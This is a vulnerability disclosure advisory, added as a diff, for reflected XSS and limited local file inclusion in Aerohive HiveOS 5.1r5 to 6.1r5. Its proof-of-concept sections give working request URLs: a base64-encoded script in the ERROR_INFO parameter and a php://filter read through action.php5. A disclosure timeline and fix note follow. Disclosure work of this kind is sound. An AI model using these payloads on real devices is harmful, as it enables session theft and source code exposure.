@@ -1,0 +1,53 @@
+# Exploit Title: Aerohive HiveOS XSS and (limited) LFI
+# Date: 11-07-2014
+# Exploit Author: Rik van Duijn - DearBytes (dearbytes.com)
+# Vendor Homepage: http://www.aerohive.com/products/overview.html
+# Version: 5.1r5 - 6.1r5 (possibly earlier versions)
+
+Description
+================
+Aerohive version 5.1r5 through 6.1r5 contain two vulnerabilities, one reflective XSS vulnerability and a limited local file inclusion vulnerability (I was only able to view source from one specific folder, maybe you can leverage this further). 
+It's possible earlier version are affected, I was only able to review 5.1r5 briefly, the vendor indicated other version up to 6.1r5 are vulnerable as well.
+
+Details
+================
+AeroHive  HiveOS Version:  5.1r5 until 6.1r5 (maybe available in earlier versions, was unable to test)
+ 
+ 
+Vulnerability
+================
+An attacker could craft an URL in order to steal a session or attack the system of the visitor to the URL. The LFI can be leveraged to view application source code, limited to one specific folder.
+
+ 
+Proof of concept XSS
+====================
+Base: http://<IP>/index.php5?ERROR_INFO=<BASE64 ENCODED JAVASCRIPT/HTML>
+echo -en '"><script>alert('XSS');</script>' | base64
+Add the output to the ERROR_INFO variable.
+
+Example:
+http://<IP>/index.php5?ERROR_INFO=Ij48c2NyaXB0PmFsZXJ0KERlYXJCeXRlcyk7PC9zY3JpcHQ+
+
+Proof of concept LFI
+====================
+Base: http://<IP>/action.php5?_action=get&_actionType=1&_page=<LFI>
+
+Example:
+http://<IP>/action.php5?_action=get&_actionType=1&_page=php://filter/convert.base64-encode/resource=ManagementAP
+
+
+Fix
+================
+The vulnerabilities were resolved in version 6.1r5.
+ 
+ 
+Disclosure Timeline
+================
+ 
+2014-03-12: Reported to vendor
+2014-03-12: Vendor confirmed, gave tracking-id
+2014-03-18: Vendor confirms issues, states it received the vulns earlier and is already addressing the issues.
+2014-04-02: Requested status update
+2014-04-02: Vendor indicates they once the new version is released
+2014-07-07: Requested status update
+2014-07-07: Vendor indicated the update was previously published
